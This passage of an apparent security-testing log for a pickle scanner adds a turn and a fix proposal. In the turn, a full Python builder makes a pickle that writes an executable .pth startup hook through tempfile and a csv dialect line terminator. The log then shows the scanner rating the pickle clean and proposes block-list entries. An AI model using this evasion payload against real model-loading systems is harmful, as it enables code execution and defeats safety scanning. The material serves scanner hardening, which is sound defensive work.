@@ -6249,3 +6249,187 @@ Blocking plan:
 Performance note: two exact entries in the existing sorted policy table and no
 codec-stream state tracking, file mode inspection, path modeling, or broad
 `codecs` wildcard block.
+
+## Turn 115 - `tempfile` plus CSV dialect startup-hook write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `tempfile` to create a
+random `.pth` file in an attacker-selected directory and `csv.DictWriter` to
+assemble the executable startup-hook line at write time.
+
+Candidate payload:
+
+- Call `tempfile.NamedTemporaryFile("w", -1, None, "", ".pth", "ma_csv_",
+  target_dir, False)` during unpickling. This creates a random `.pth` file
+  under an attacker-selected directory and keeps it after close.
+- Build a CSV dialect class with `builtins.type`. The dialect uses
+  `quoting=csv.QUOTE_NONE`, an escape character, and a custom
+  `lineterminator`.
+- Build that line terminator with `builtins.str.join` from harmless fragments:
+  `"im"`, `"port pathlib;pathlib.Path("`, `repr(marker_path)`, and
+  `").write_text('owned-by-csv-tempfile')\n"`. No individual pickle string
+  contains an import statement.
+- Construct `csv.DictWriter(file, (), "", "raise", dialect)` and call
+  `csv.DictWriter.writerow(writer, {})`. With no fieldnames, CSV writes only
+  the custom line terminator, producing a valid executable `.pth` line.
+- Close the tempfile wrapper, then normal Python site processing executes the
+  random `.pth` file and writes the marker.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def setitem(key: str, value: bytes) -> bytes:
+    return text(key) + value + b"s"
+
+
+def tuple_for(values: list[bytes]) -> bytes:
+    if not values:
+        return b")"
+    if len(values) == 1:
+        return values[0] + b"\x85"
+    if len(values) == 2:
+        return values[0] + values[1] + b"\x86"
+    return b"(" + b"".join(values) + b"t"
+
+
+target_dir = Path("/tmp/ma_csv_tempfile_dir")
+marker = target_dir / "ma_csv_tempfile_marker"
+fragments = [
+    "im",
+    "port pathlib;pathlib.Path(",
+    repr(str(marker)),
+    ").write_text('owned-by-csv-tempfile')\n",
+]
+
+parts = [b"\x80\x04"]
+parts += [sg("tempfile", "NamedTemporaryFile")]
+parts += [
+    b"(",
+    text("w"),
+    b"J\xff\xff\xff\xff",
+    b"N",
+    text(""),
+    text(".pth"),
+    text("ma_csv_"),
+    text(str(target_dir)),
+    b"\x89",
+    b"tR\x94",
+]
+parts += [sg("builtins", "str.join")]
+parts += [text(""), tuple_for([text(fragment) for fragment in fragments]), b"\x86R\x94"]
+parts += [sg("builtins", "type"), b"(", text("CsvPthDialect"), b")", b"}"]
+parts += [
+    setitem("delimiter", text(",")),
+    setitem("quotechar", text('"')),
+    setitem("lineterminator", b"h\x01"),
+    setitem("quoting", b"K\x03"),
+    setitem("doublequote", b"\x88"),
+    setitem("skipinitialspace", b"\x89"),
+    setitem("escapechar", text("\\")),
+    setitem("strict", b"\x89"),
+    b"tR\x94",
+]
+parts += [sg("csv", "DictWriter")]
+parts += [b"(", b"h\x00", b")", text(""), text("raise"), b"h\x02", b"tR\x94"]
+parts += [sg("csv", "DictWriter.writerow")]
+parts += [b"h\x03", b"}", b"\x86R0"]
+parts += [sg("tempfile", "_TemporaryFileWrapper.close"), b"h\x00\x85R."]
+payload = b"".join(parts)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=580`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- Control coverage: `bytes_scanned=580`, `bytes_total=580`,
+  `opcode_count=82`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Control import references: `tempfile.NamedTemporaryFile`,
+  `builtins.str.join`, `builtins.type`, `csv.DictWriter`, and
+  `tempfile._TemporaryFileWrapper.close`, all with `is_dangerous=False`
+- Control runtime: `pickle.loads(control)` creates an empty random
+  `ma_csv_*.pth` file and returns `None`; `site.addsitedir(target_dir)` does
+  not create the marker.
+- RCE scanner result: `len=613`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- RCE coverage: `bytes_scanned=613`, `bytes_total=613`, `opcode_count=90`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- RCE import references: `tempfile.NamedTemporaryFile`, `builtins.str.join`,
+  `builtins.type`, `csv.DictWriter`, `csv.DictWriter.writerow`, and
+  `tempfile._TemporaryFileWrapper.close`, all with `is_dangerous=False`
+- String heuristic matches: `[]`
+- Before unpickle: no `.pth` file and no marker exists.
+- After `pickle.loads(payload)`: a random `ma_csv_*.pth` file exists and
+  contains
+  `import pathlib;pathlib.Path('/tmp/.../ma_csv_tempfile_marker').write_text('owned-by-csv-tempfile')`;
+  the marker does not exist yet.
+- After normal `site.addsitedir(target_dir)`: the marker exists and contains
+  `owned-by-csv-tempfile`.
+
+RCE mechanism:
+
+- `NamedTemporaryFile` gives the attacker a durable random `.pth` file in a
+  chosen directory without using any blocked `open` global.
+- CSV dialect line terminators are written verbatim by `writerow()`. With no
+  fieldnames and an empty row, the row body is empty and the line terminator is
+  the whole file content.
+- `builtins.str.join` assembles the executable `.pth` line only at runtime, so
+  no individual pickle string contains an import statement for the string
+  heuristic to catch.
+- In a model-loading process, any writable directory later processed by
+  `site.addsitedir()` or present on startup can become a code-execution sink.
+
+Why the scanner missed it:
+
+- `tempfile` is only a warning module for `mktemp`; `NamedTemporaryFile` and
+  `_TemporaryFileWrapper.close` are not dangerous globals.
+- `csv` is not a wildcard-dangerous module, and neither `csv.DictWriter` nor
+  `csv.DictWriter.writerow` is listed in `DANGEROUS_GLOBALS`.
+- `builtins.str.join` and `builtins.type` are clean, and the payload uses no
+  suspicious magic-method names.
+- The startup hook is split across benign string fragments and assembled into
+  the CSV dialect's `lineterminator` at unpickle time.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for `tempfile.NamedTemporaryFile`, `csv.DictWriter.writerow`, and
+`csv.DictWriter.writerows`. This blocks durable attacker-selected tempfile
+creation plus the reachable Python-level CSV write dispatch while keeping the
+hot path to sorted table lookups and avoiding CSV dialect simulation, tempfile
+path modeling, or broad `csv`/`tempfile` wildcard blocking.
+
+## Turn 116 - Block tempfile plus CSV row dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for `tempfile.NamedTemporaryFile`,
+  `csv.DictWriter.writerow`, and `csv.DictWriter.writerows`.
+- Leave `tempfile._TemporaryFileWrapper.close`, `csv.DictWriter`,
+  `builtins.str.join`, and `builtins.type` allowed. The targeted write side
+  effects are durable attacker-selected tempfile creation and the reachable
+  Python-level row dispatch methods.
+- Add a CPython oracle regression for the Turn 115 random `.pth` chain. The
+  constructor-only control is now malicious because it creates a durable
+  attacker-selected `.pth` file, but remains operationally side-effect limited:
+  the file is empty and `site.addsitedir()` does not create the marker.
+- Cover both `csv.DictWriter.writerow` and `csv.DictWriter.writerows`. Each
+  active payload remains executable under CPython and writes the fragmented
+  startup hook before normal `site.addsitedir()` runs it.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: three exact entries in the existing sorted policy table and
+no CSV dialect simulation, tempfile path modeling, file mode inspection, or
+broad `csv`/`tempfile` wildcard block.
